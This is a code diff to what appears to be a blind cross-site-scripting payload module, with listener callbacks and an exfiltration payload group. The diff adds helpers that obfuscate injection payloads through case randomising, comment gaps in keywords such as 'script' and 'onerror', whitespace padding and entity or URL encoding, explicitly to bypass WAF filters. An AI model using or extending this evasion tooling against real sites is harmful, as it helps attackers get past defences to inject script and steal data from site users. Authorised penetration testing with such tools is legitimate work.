@@ -5,6 +5,8 @@ All payloads MUST contain {UUID} and {LISTENER} placeholders for correlation and
 Integrated from battle-tested payloads; context-aware for different injection points.
 Callback format: {LISTENER}/c/{UUID}
 """
+import random
+import urllib.parse
 
 # Script injection payloads (direct script tag loading, most reliable)
 SCRIPT_PAYLOADS = [
@@ -110,6 +112,56 @@ def get_all_payloads():
         "header": HEADER_PAYLOADS,
         "exfil": EXFIL_PAYLOADS,
     }
+
+
+# --- Mutation helpers (lightweight evasions) ---
+def _mutate_case(payload: str) -> str:
+    """Randomize casing of HTML/JS keywords to dodge naive filters."""
+    return random.choice([payload.lower(), payload.upper(), payload.swapcase()])
+
+
+def _insert_comment_gaps(payload: str) -> str:
+    """Split risky tokens with harmless comment gaps (e.g., scr<!-- -->ipt)."""
+    replacements = {
+        "script": "scr<!-- -->ipt",
+        "onerror": "on<!-- -->error",
+        "onload": "on<!-- -->load",
+        "javascript:": "java<!-- -->script:",
+    }
+    mutated = payload
+    for needle, repl in replacements.items():
+        mutated = mutated.replace(needle, repl).replace(needle.upper(), repl).replace(needle.capitalize(), repl)
+    return mutated
+
+
+def _pad_whitespace(payload: str) -> str:
+    """Add benign whitespace to break strict regex rules."""
+    return payload.replace("<", "< ").replace(">", " >")
+
+
+def _html_entity_encode(payload: str) -> str:
+    """Encode critical chars to bypass naive blockers (aggressive)."""
+    return payload.replace("<", "&#60;").replace(">", "&#62;").replace("\"", "&#34;")
+
+
+def _url_encode_fragments(payload: str) -> str:
+    """URL-encode risky characters while keeping path separators (aggressive)."""
+    return urllib.parse.quote(payload, safe="/:{}")
+
+
+def apply_mutators(payload: str, aggressive: bool = False, max_mutations: int = 2) -> str:
+    """Apply a small set of obfuscation steps to help bypass naive WAF filters."""
+    base_mutators = [_mutate_case, _insert_comment_gaps, _pad_whitespace]
+    extra_mutators = [_html_entity_encode, _url_encode_fragments] if aggressive else []
+    mutators = base_mutators + extra_mutators
+    try:
+        choices = random.sample(mutators, k=min(max_mutations, len(mutators)))
+        mutated = payload
+        for fn in choices:
+            mutated = fn(mutated)
+        return mutated
+    except Exception:
+        return payload
 
 
 def substitute_placeholders(payload: str, listener_url: str, uuid: str) -> str:
